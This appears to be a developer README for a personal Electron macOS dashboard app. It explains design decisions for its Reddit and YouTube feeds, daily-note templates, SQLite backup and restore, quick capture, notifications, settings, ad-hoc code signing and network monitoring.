So `parseRedditFeed` reads the Atom feed. Cost, accepted: the feed carries no
score, comment count, flair or NSFW flag, so `score`/`numComments` are optional
on `RedditPost` and the widget omits them rather than showing a fake 0. A 200
without a `<feed` is treated as the block page, not an empty subreddit. If the
feed goes too, the warm-up still works and the next fallback is the OAuth path
in git history.

The cookies persist to disk, so the warm-up happens on first run and then only
when the session lapses. Measured: ~800ms cold including warm-up, ~400ms warm,
reproducible across three consecutive wiped partitions.

**A plain `fetch` to reddit.com is not a substitute for the window.** It gets an
8KB interstitial and only a useless `edgebucket` cookie, and every subsequent
`.json` request 403s. The JS has to actually run. That's the whole mechanism —
don't "simplify" the hidden window away.

Details worth not losing:

- **The warm-up is coalesced** (`ensureWarm`). Without it the concurrent
  per-subreddit fetches would each open their own hidden window when they all
  403 together. Caught by a test, not by eye.
- **A 403/429 re-warms once and retries**, because the session can lapse; a
  second block is a real failure.
- **The hidden window is hardened** — `nodeIntegration: false`,
  `contextIsolation: true`, `sandbox: true`, no preload — and destroyed in a
  `finally`. It renders a remote page, so it gets the same treatment any
  untrusted content would.
- **Destroying it can't quit the app**: `window-all-closed` only fires when
  *every* window is gone, and the dashboard window is hidden rather than
  destroyed on close (see "Notifications + tray"). Worth knowing if that ever
  changes.
- **Every configured subreddit is fetched per call**, not just the active
  sub-tab, which buys instant sub-tab switching.
- **A nonexistent subreddit returns 200 with an empty listing**, not a 404 — so
  it reads as "No recent posts" rather than an error. That's accurate, not a
  bug to fix.
- **Failure granularity is per row in both widgets** (`git.ts`'s model): one
  dead channel id or subreddit shows its own reason without blanking the
  widget, but a failure common to all of them — every channel unreachable, a
  session that won't establish — is reported once at the top level.

**This is an unofficial path and Reddit can change it.** The stable documented
alternative is the OAuth `client_credentials` grant (a "script" app's id +
secret). It was built, tested, and then deliberately removed in favour of
needing no setup at all — so recover it from git history rather than
reinventing it if this ever breaks.

**`parseYouTubeFeed` is a feed-specific extractor, not an XML parser.** There
is no XML dependency in this repo and one machine-generated Atom feed doesn't
earn one (same call as skipping `tree-kill` in `processes.ts`). It only
understands this document shape; anything else — notably the HTML page YouTube
serves for an unknown channel id — yields no entries rather than throwing,
which is what the caller wants anyway. It's exported solely so it can be
tested against a fixture without a network.

**Everything both widgets render is attacker-controllable text off the open
internet.** Titles, authors and flair go in as React text children, never
`dangerouslySetInnerHTML`, and every thumbnail `src` and outbound URL goes
through `safeUrl()` (`renderer/src/lib/urls.ts`) first. Reddit's `thumbnail`
field also carries the sentinels `self`/`default`/`nsfw`/`spoiler` rather than
a URL, which `toRedditPost` maps to `undefined`; a thumbnail that fails to
load falls back to an empty well rather than the browser's broken-image icon,
which reads as a rendering fault against this palette.

`shared/subreddit.ts` holds `normalizeSubreddit` — the one definition of what
counts as a subreddit name, used by the Settings form (inline validation), by
the settings write, and again in `fetchListing` just before the name becomes a
URL path segment. Same reason `shared/accelerator.ts` exists. That last check
is what stops a `../` ever reaching a `/r/<name>/new` URL.

## Daily note template

Settings → Grimoire takes a vault-relative `dailyTemplatePath`. When a daily
note doesn't exist yet, `readDailyNote` returns the rendered template in
`templateContent` — **separately from `content`, which stays empty**. The
template is applied at the moment of creation, not previewed:

- **Typing** — `DailyNoteWidget`'s first keystroke into a missing note swaps the
  buffer for `template + "\n" + typed` and marks the note no longer missing, so
  the header stops saying "Start typing to create …" and the save status
  appears. A `seeded` ref keyed by date stops a second copy being prepended if
  the editor is cleared and typed into again (`data.missing` stays true until a
  reload).
- **Quick capture** — `captureToDailyNote` uses `templateContent` as its base
  when the note is missing, so the captured line lands beneath the template.

The first version returned the template *as* `content`, which pre-filled the
editor. Don't go back to that: a file that doesn't exist then looks exactly
like one that does — complete with a "Saved" label — and reads as some other
day's note. `showStatus={!creating}` keeps that label off an uncreated note.

**Applied on read, not in `saveDailyNote`.** Writing it there would mean
guessing whether the incoming content already contains the template — the
ambiguity that produces duplicated headings.

Seeding on the first keystroke depends on `MarkdownEditor`'s external-sync
effect shifting the caret when the new value *ends with* the old one: content
was prepended, so holding the caret at its absolute offset would drop it inside
the template instead of after what was just typed.

**Templater blocks are stripped, `{{date}}` placeholders are filled.** This is
the opposite of `services/notes.ts`'s `createNote`, which copies templates raw
and lets Templater evaluate them — and both are correct for their case.
Templater only processes files *it* creates, so a note written by the dashboard
would keep a literal `<%* … %>` code block forever. The cost, accepted
knowingly: anything the Templater JavaScript would have generated is absent.

Placeholders resolve against **that note's own date**, not today, so an older
empty day still renders coherently.

Two details in `dailyTemplate.ts` worth not "fixing":

- **`ww` is the ISO week** (Monday-start, zero-padded), verified against this
  vault's own convention: `5 Logs/Weekly Notes/2026-W24.md` covers June 8-12
  2026, which is exactly ISO week 24. Locale-based numbering drifts from that
  at Sunday boundaries and would generate links to week notes that don't exist.
- **`YYYY` is the calendar year, not the ISO week-year** (moment calls the
  latter `GGGG`). So 2027-01-01 renders as `2027-W53` even though that date is
  ISO week 53 of *2026*. It looks wrong; it's what Obsidian would produce for
  the same template, which is the point.

## Backups

Everything the app owns is in one SQLite file — including every API token, in
plaintext. `services/backup.ts` writes
`userData/backups/command-center-YYYY-MM-DD.db` on launch, keeps the newest
`backup.keep` (default 7), and Settings → Data offers a manual export via a
save dialog.

**Use `db.backup()`, never `fs.copyFile`.** The database runs in WAL mode
(`db.ts:17`), so recent commits can still live in the `-wal` sidecar; a plain
copy of the `.db` produces a backup that looks valid and silently omits them.
`db.backup()` is SQLite's online backup API and accounts for both the WAL and
concurrent writes.

Two details that are easy to lose:

- **One backup per calendar day**, guarded by the filename itself rather than
  stored state — so ten launches in a day produce one file, and the guard
  survives restarts for free. The stamp is local-time, not `toISOString()`,
  which would file an evening backup under tomorrow.
- **The copy is consolidated to a single file** afterwards
  (`wal_checkpoint(TRUNCATE)` + `journal_mode = DELETE`). Without that step the
  backup inherits WAL mode and drags `-wal`/`-shm` sidecars along, so an export
  hands the user three files when they'll only think to copy one.

**Restore** (Settings → Data) cannot swap the file under the open connection,
so it is two steps: `stageRestore` validates the chosen file (integrity check
plus a `settings` table, so an arbitrary SQLite file is refused), writes a
`pre-restore-<ts>.db` safety copy of the *current* database, and copies the
chosen one to `restore-pending.db` through SQLite's backup API; the app then
relaunches and `applyPendingRestore()` — run **before** `initDatabase()` in
`main/index.ts` — renames it into place and deletes the old `-wal`/`-shm`
(left behind they would be replayed onto the restored file). A failed apply
discards the staged file so a stale one can't be applied by a later launch.
`backup:restore` only accepts a path `listBackups()` returned; the free-form
picker is the separate `backup:restoreFromFile`. Safety copies are named
outside the `command-center-` pattern so rotation never prunes them. Restoring
also restores that file's API tokens. Not covered by an automated test:
`better-sqlite3` here is built for Electron's ABI.

The export card states that the file contains tokens in plaintext. Keep that
warning — it's the difference between an informed export and a leak.

## Quick capture

A global hotkey (default `Cmd+Ctrl+Alt+Shift+Q`, the hyperkey combo) opens a
small frameless panel from any app, appending a timestamped line to today's
daily note (default) or the scratchpad. `services/capture.ts` composes the
existing grimoire/scratchpad services; `services/captureWindow.ts` owns the
window and the shortcut. The panel is a second renderer entry
(`src/renderer/capture.html`, wired in `electron.vite.config.ts`).

Three macOS specifics, each found by it going wrong:

- **`type: "panel"` is required, and is not sufficient on its own.** As a plain
  window the panel shows on top but the previously-active app keeps keyboard
  focus, so everything typed goes *into that app* — the panel shows a caret and
  silently drops input. As an NSPanel it can take key focus without activating
  the app, but macOS still won't give it focus unless the app becomes active:
  hence `app.focus({ steal: true })` in `toggleCaptureWindow`. Electron reports
  `isFocused() === true` throughout, so this failure is invisible from inside.
  Hidden windows stay hidden through the activation, so summoning the panel
  does not drag the dashboard forward.
- **`globalShortcut.register()` is not a validator on macOS.** It returns
  `true` for a malformed string like `"NotAReal+Key+Q"` and for combos another
  app already owns (verified with `Cmd+Space`, which Spotlight holds). So
  `shared/accelerator.ts` validates the string itself — that catches a typo,
  the failure a user typing into the field will actually hit. A genuine
  conflict with another app is **not detectable**; the Settings copy says so
  rather than implying a check exists. Don't "improve" this by trusting the
  return value.
- **The panel hides on blur and clears its buffer**, so a half-typed thought
  never lingers invisibly.

**Capture writes can clobber the UI's buffer.** Both targets are also edited by
autosaving widgets holding the *entire* document in renderer memory, so an
append behind their back would be overwritten by their next save. Main
broadcasts `{ type: "captured", target }` over `app:command`; the owning widget
calls `autosave.cancel(...)` and reloads. `cancel` (not `flush`) is the right
one — flushing would write the pre-capture buffer over the captured line.

## Notifications + tray

Desktop notifications for three transitions — CI turning red, a managed process
crashing, a Docker container stopping — plus a menubar tray that always shows
current status. Toggled per-trigger in Settings → General → Notifications.

**Detection lives in the renderer, in `renderer/src/lib/alerts.ts`.** That's
where the polled state already is, so no new polling was added: an effect in
`App.tsx` keyed on `[github, processStatuses, docker]` diffs the current
snapshot against the previous one. The module is pure (no React, no IPC, no
clock) so the rules can be tested directly. Main's only job is turning a
decided alert into an OS notification.

Two rules that matter, and are easy to regress:

- **Edge-triggered, never level-triggered.** Alerts fire when something
  *changes into* a bad state. Level-triggering would re-notify about the same
  red build every poll — Docker's is every 15s.
- **The first poll seeds the baseline and fires nothing**, so launching with CI
  already red doesn't produce a burst about things you already knew. A key
  absent from the previous snapshot is likewise skipped, so a newly-configured
  repo that's already failing stays quiet.

A deliberate process stop needs no special-casing: `services/processes.ts`
records `null` when a child dies by signal, and a crash is `exitCode` non-null
and non-zero — so SIGTERM stops can't reach the crash rule.

**Close hides the window instead of destroying it** (`main/index.ts`'s `close`
handler). Every poller lives in the renderer, so a destroyed window would mean
no polling, no notifications, and a tray frozen at its last value. `quitting`
distinguishes a real quit, which falls through to the existing `before-quit` →
`stopAllProcesses()` → `app.exit()` path.

**`app:command` is the general main→renderer channel**; everything else is
renderer→main `invoke`, with three deliberate exceptions, all the Assistant's
and all tagged with a renderer-chosen `requestId` and sent only to the asking
window: `assistant:delta` streams reply text, `assistant:approval` delivers a
confirmation card, and `assistant:tool` reports a tool call starting or
finishing — each while its `assistant:ask` invoke is still pending (see
"Assistant tab"). `app:command` exists because the tray menu and notification clicks
originate in main. Both are exposed as a subscription
returning an unsubscribe — the raw `IpcRendererEvent` never crosses the bridge,
since it carries `sender`.

### macOS gotchas (all found the hard way)

- **A menu bar manager can swallow the tray icon entirely.** This machine runs
  [Ice](https://github.com/jordanbaird/Ice), which hides new status items into
  a collapsed section by default (`AutoRehide`), re-hiding after 15s. `new
  Tray()` succeeds, no error is raised, and nothing is visible. If the icon
  seems missing, expand the hidden section before suspecting the code — this is
  the most likely explanation for a "the tray doesn't work" report.
- **Notifications need a LaunchServices launch.** Running the binary directly
  (`Contents/MacOS/Command Center`) makes `show()` silently do nothing — no
  banner and no `failed` event. Launch with `open path/to/Command Center.app`.
  This bites when testing from a terminal.
- **Test notifications against the packaged app, not `npm start`.** Dev runs
  `node_modules`' Electron, identity `com.github.Electron`, so notifications
  appear under the name "Electron" and register separately. Only the packaged,
  ad-hoc-signed bundle posts as Command Center (see the packaging note below).

## Settings

The gear icon in the header (`.refresh-control`, next to Refresh) opens
`components/SettingsPage.tsx` — a full-screen overlay (same scrim+panel visual
language as `CommandPalette`/`NoteBrowserModal`, closes via scrim-click/Escape/X)
with a left section-nav (General, Grimoire, Integrations, Vaults, Repositories,
Processes, Social, Data) and a scrollable content pane. It's app-wide config management, not a
per-tab widget, so it skips the five-touch-point pattern — its data model is
`services/settings.ts` end to end (see Architecture above), exposed through a
`window.api.settings.*` namespace mirroring the `links`/`habits` CRUD shape.

Scalar sections (API tokens, refresh intervals, vault path) each render as their
own card with an explicit **Save** button and a dirty-state check — no
autosave-per-keystroke, so a half-typed token never gets persisted mid-edit and
picked up by a background poll. Secrets (Todoist token, Google Calendar client
secret, Readwise token, GitHub token, Firecrawl API key) render as masked `type="password"` fields
with an eye-icon reveal toggle (`IconEye`/`IconEyeOff` in `components/icons.tsx`);
stored in plaintext in the settings DB, same trust level as the old gitignored
`config.json`. Array sections (Vaults, GitHub Repos, Processes, and Social's
YouTube channels + subreddits) save immediately per row-action instead, matching
`LinkLauncherWidget`'s inline add/edit/delete + `@dnd-kit` reorder convention —
each backed by a small dedicated hook in
`renderer/src/hooks/useSettingsLists.ts` (`useVaultSettingsList`,
`useGithubRepoSettingsList`, `useProcessSettingsList`,
`useYouTubeChannelSettingsList`, `useSubredditSettingsList`), same shape as
`useLinkList.ts`. Social is the one section holding two lists — they're the two
halves of one tab's configuration, not two unrelated things to navigate between.

Four values `App.tsx` already caches reactively — `processConfigs`,
`appRefreshMinutes`, `dockerRefreshSeconds`, `githubRefreshSeconds` — get pushed
back up via callback props on save, so editing an interval in Settings changes
the live polling cadence immediately (Docker's and GitHub's refresh intervals
each run in their own `useEffect` keyed on the corresponding state, not a
one-shot `setInterval` from boot). Everything else the page shows is read fresh
via IPC on next use, no client-side cache to reconcile.

**`config.json` migration.** `config.json`/`config.example.json` are legacy
inputs now, not a runtime dependency — `services/settings.ts`'s
`readLegacyConfigFile()` + `seedSettingsFromLegacyConfig()` run once at boot,
seed any settings row/table that's still empty from `config.json` (or, absent
that, from bundled `config.example.json` defaults), and never touch the file
again. A packaged app no longer auto-creates a `userData/config.json` on first
launch either — a brand-new install seeds straight from the bundled defaults in
memory. `config.json` is still gitignored and `config.example.json` still
committed, purely as that one-time seed source / first-run default reference.

## Roadmap (rough effort order)

1. Drag-to-rearrange grid — now that the renderer is React, `react-grid-layout` or similar.

## Run

```bash
npm install          # first time — pulls in Electron + the Vite toolchain
npm start            # launch (electron-vite dev)
npm run dev          # launch with detached devtools
npm run build         # production bundle → out/
npm run preview       # run the production bundle
npm run package       # build a real macOS .app → dist/mac-arm64/Command Center.app
npm run typecheck     # tsc --noEmit across main+preload and renderer configs
```

## Notes

- Docker widget needs the Docker daemon running; degrades gracefully if not.
- Terminal launching targets Warp via a generated Tab Config (`~/.warp/tab_configs/`).
  Swap `services/launcher.ts` for your terminal of choice, or fill in Linux/Windows
  branches, as needed.
- All settings below are edited via the Settings page (gear icon), not a config
  file. `config.json` is gitignored and only used as a one-time migration source for
  an existing install (see "Settings" above); `config.example.json` is the committed
  reference for first-run defaults on a brand-new install.
- **Reader widget** needs a Readwise access token (`https://readwise.io/access_token`)
  in Settings → Integrations → Readwise Reader — without one it fails soft with "No
  Readwise API token configured".
- **Google Calendar setup**: create a Google Cloud project, enable the Calendar API,
  set the OAuth consent screen to External with yourself as a test user (skips Google's
  app-verification process entirely), then create an OAuth client of type **Desktop app**
  under Credentials. Paste the Client ID/Secret into Settings → Integrations → Google
  Calendar, then click "Connect Google Calendar" in the widget — it opens your browser
  for one-time consent and caches tokens after that.
- **GitHub widget setup**: put a personal access token (repo + read:org scope) and your
  review username into Settings → Integrations → GitHub, and list repos to track under
  Settings → Repositories. Without a token the widget fails soft with "No GitHub token
  configured".
- **Firecrawl widget setup**: put an API key from the Firecrawl dashboard into
  Settings → Integrations → Firecrawl. Without one the widget fails soft with
  "No Firecrawl API key configured".
- **Git widget setup**: give a row under Settings → Repositories a **local path**. That
  section backs both widgets: `owner`/`repo` put a row in the GitHub widget, a local
  path puts it in the Git widget, and either alone is valid — so a local-only scratch
  repo with no GitHub counterpart is fine, as is a GitHub repo you haven't cloned.
  Clicking a row opens it in ForkLift. Its poll interval is Settings → General → Git
  (default 30s), deliberately separate from GitHub's 300s: local git costs no API quota.
- **Notes tab setup**: add vault roots to browse under Settings → Vaults (a label +
  the vault's root folder path, each). Without any configured, the nav shows "No
  vaults configured"; with none yet pinned for a given vault, its group still shows
  so you can click "+" to add the first one.
- **Managed Processes setup**: add processes under Settings → Processes (label,
  command, args, optional working dir/URL/auto-open-delay each — the process id is
  auto-generated from the label, editable before first save, immutable after since
  `services/processes.ts`'s runtime tracking keys off it). Without any configured,
  the widget shows "No processes configured". Prefer an explicit args list over a
  shell string where possible (matches `docker.ts`'s `execFile`-over-`exec`
  preference elsewhere in this codebase).
- **Social tab setup**: add channels under Settings → Social → YouTube channels
  — paste a @handle, a channel URL, or a `UC…` ID; all three resolve, and the
  label fills itself in from the channel's name if left blank. No API key: it
  reads YouTube's public feed. Subreddits go in the same
  section, one per row, typed however you like (`rust`, `r/rust`, or a pasted
  URL — all normalize to the bare name); their order is the sub-tab order.
  Reddit needs no credentials, no account and no setup at all — see "Social
  tab" above for how. Neither list is seeded from `config.json`; both are new
  tables with no legacy ancestor.
- **Packaged app is ad-hoc signed, not Gatekeeper-trusted** (no Apple Developer cert
  configured). First launch is still blocked as "unidentified developer" — right-click
  the app → Open once to bypass, or `xattr -cr "Command Center.app"`.
  `electron-builder.yml` sets `mac.identity: "-"` deliberately: leaving it unset means
  "auto-discover a certificate", which finds none and **skips signing entirely**,
  shipping the bundle with the linker's own signature whose identifier is the literal
  string `Electron` and which doesn't cover Info.plist. macOS then treats the app's
  identity as generic Electron — shared with dev-mode Electron and every other ad-hoc
  Electron app on the machine — which breaks notification permissions. (Electron 42+
  makes that fatal rather than flaky: macOS notifications moved to `UNNotification`,
  which refuses to display for an unsigned app.) `hardenedRuntime: false` accompanies
  it, since hardened runtime enforces library validation that an ad-hoc bundle fails at
  launch without a `disable-library-validation` entitlement.

  Signing is electron-builder's job, **not** the `package` script's — don't add a
  manual `codesign` step. electron-builder signs the bundle inside-out (every helper,
  framework, and `.dylib` in dependency order); a post-hoc `codesign --force --deep`
  would overwrite that with a blunter signature, and Apple treats `--deep` as a
  repair tool rather than a build step. What the script *does* add is
  `npm run verify:signing`, chained onto `package`, because both regressions here are
  silent: removing `mac.identity` makes electron-builder skip signing with only a
  warning, and on a non-macOS host it skips unconditionally. The check asserts the
  Identifier is `com.craig.command-center` and exits non-zero otherwise. Its path is
  hardcoded to `dist/mac-arm64/` — update it if you ever build universal or x64. All settings live in the packaged
  app's SQLite DB at `~/Library/Application Support/Command Center/command-center.db`,
  editable via the Settings page — not a file to hand-edit.

### Network monitoring

`services/networkStats.ts` collects interface counters with `netstat -ib` and
per-process external TCP/UDP counters with `nettop`. Rates use deltas over the
actual interval between reads; the first read establishes a baseline. Concurrent
requests share a single poll. The default route selects the automatic interface
(IPv6 fallback when the IPv4 route lookup fails); the widget also allows manual
selection. A missing default route does not silently select an arbitrary interface.

Each interface has independent in-memory transfer totals and five minutes of
history. Restarting the app, disappearing interfaces, and counter resets start a
new monitoring session. Top apps rank observed processes by combined transferred bytes in the last five
minutes across all external interfaces, not just the selected interface. The UI
shows five by default with an expand action for the full list. Idle and ended
processes retain their measured transfers until they age out. Current rates remain
visible separately. Rolling transfers are assigned to their observation time;
collection failures reset the rate baseline but retain recent history. New processes need two
observations; processes that exit between polls may be missed. These socket
counters need not equal interface totals. App-collection failures do not hide
interface readings. No network traffic is generated by these local collectors;
public-IP lookup remains a separate opt-in operation.

## Performance and background work

- `usePolling` schedules the next request after completion, stops on cleanup,
  and shares an outstanding cycle when visibility changes. App startup loads
  settings before enabling polls; there is no automatic full-dashboard refresh.
  The manual Refresh all command still refreshes every feature.
- Docker status, GitHub status, process summaries, and budget health remain in
  the background for the tray and notifications. Other services load with their
  tab. Detailed Stats pause off-tab and when hidden; optional background network
  history is controlled in Settings. Storage and battery use a one-minute cadence.
- Fast Stats state lives in `StatsPanel`; unchanged process/Spotify snapshots and
  tray summaries are not republished. Markdown previews are memoized.
- `requests.ts` coalesces identical outstanding read IPC calls. Do not register
  mutations through it. `http.ts` adds deadlines and GET failure/rate-limit
  backoff; mutations are never retried automatically.
- `usage-worker.ts` indexes Claude and Codex transcripts in a worker. The derived
  `transcript-index.sqlite` under userData stores parsed records and byte offsets;
  it can be rebuilt from source transcripts. Complete appended JSONL records are
  parsed incrementally, retaining context; truncation/replacement invalidates
  cached entries. Usage deduplication and subset-token accounting are unchanged.
  Deleted files are pruned. The worker exits after two idle minutes to release
  memory, and restarts lazily using the persisted index.
- Vault indexes use asynchronous directory reads and a bounded service cache.
  Restored inactive note tabs defer content reads until selected; pending writes
  still flush on close/unmount. Do not show an editable empty buffer while loading.
- Git limits concurrency to three repositories and caches last-commit metadata by
  HEAD. Routine process status excludes logs; visible log panels request them
  separately, with a 512 KiB retained-output limit per process.

Validation: `npm test`, `npm run typecheck`, `npm run build`, then
`npm run test:electron` (requires a graphical session). Native SQLite tests
must use Electron's ABI (for example an `ELECTRON_RUN_AS_NODE=1` smoke test), not a
host-Node rebuild of the installed native module. Profile the packaged app on
Home, hidden in the tray, on Stats, and with large transcript/vault histories;
include worker and renderer processes in memory totals.
